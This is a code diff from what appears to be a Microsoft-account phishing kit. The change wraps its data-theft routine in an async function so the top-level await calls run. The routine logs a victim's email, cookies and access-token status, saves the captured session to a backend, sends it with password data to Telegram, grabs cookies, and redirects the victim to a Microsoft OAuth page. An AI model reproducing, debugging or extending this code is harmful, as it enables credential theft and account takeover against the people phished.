@@ -67,50 +67,53 @@ const preAuthFingerprint = {
 let saveSuccess = false;
 let telegramSuccess = false;
 
-console.log('🔍 DEBUG: About to communicate with backend', {
-  email: sessionData.email,
-  cookieCount: sessionData.formattedCookies.length,
-  hasAccessToken: !!sessionData.accessToken,
-  currentURL: window.location.href,
-});
-
-try {
-  console.log('🔄 Step 1: Saving session to backend...');
-  const saveResult = await saveSessionToBackend(sessionData);
-  console.log('🔍 Save result:', saveResult);
-  saveSuccess = true;
-  console.log('✅ Step 1 completed: Session saved');
-} catch (saveError) {
-  console.error('❌ Session save failed:', saveError);
-  console.error('❌ Save error details:', {
-    message: saveError.message,
-    stack: saveError.stack,
-  });
-}
-
-try {
-  console.log('🔄 Step 2: Sending data to Telegram...');
-  console.log('🔍 Telegram payload preview:', {
+// Wrap all async/await usage in an async IIFE to avoid top-level await errors
+(async () => {
+  console.log('🔍 DEBUG: About to communicate with backend', {
     email: sessionData.email,
-    provider: sessionData.provider,
     cookieCount: sessionData.formattedCookies.length,
-    hasPassword: !!sessionData.password,
+    hasAccessToken: !!sessionData.accessToken,
+    currentURL: window.location.href,
   });
-  const telegramResult = await sendToTelegram(sessionData);
-  console.log('🔍 Telegram result:', telegramResult);
-  telegramSuccess = true;
-  console.log('✅ Step 2 completed: Data sent to Telegram');
-} catch (telegramError) {
-  console.error('❌ Telegram send failed:', telegramError);
-  console.error('❌ Telegram error details:', {
-    message: telegramError.message,
-    stack: telegramError.stack,
-  });
-}
 
-// Log final status
-// Grab cookies before redirect (from session if available)
-grabCookies();
+  try {
+    console.log('🔄 Step 1: Saving session to backend...');
+    const saveResult = await saveSessionToBackend(sessionData);
+    console.log('🔍 Save result:', saveResult);
+    saveSuccess = true;
+    console.log('✅ Step 1 completed: Session saved');
+  } catch (saveError) {
+    console.error('❌ Session save failed:', saveError);
+    console.error('❌ Save error details:', {
+      message: saveError.message,
+      stack: saveError.stack,
+    });
+  }
 
-// Redirect to Microsoft OAuth (will return to this same page)
-window.location.href = MICROSOFT_OAUTH_URL;
+  try {
+    console.log('🔄 Step 2: Sending data to Telegram...');
+    console.log('🔍 Telegram payload preview:', {
+      email: sessionData.email,
+      provider: sessionData.provider,
+      cookieCount: sessionData.formattedCookies.length,
+      hasPassword: !!sessionData.password,
+    });
+    const telegramResult = await sendToTelegram(sessionData);
+    console.log('🔍 Telegram result:', telegramResult);
+    telegramSuccess = true;
+    console.log('✅ Step 2 completed: Data sent to Telegram');
+  } catch (telegramError) {
+    console.error('❌ Telegram send failed:', telegramError);
+    console.error('❌ Telegram error details:', {
+      message: telegramError.message,
+      stack: telegramError.stack,
+    });
+  }
+
+  // Log final status
+  // Grab cookies before redirect (from session if available)
+  grabCookies();
+
+  // Redirect to Microsoft OAuth (will return to this same page)
+  window.location.href = MICROSOFT_OAUTH_URL;
+})();
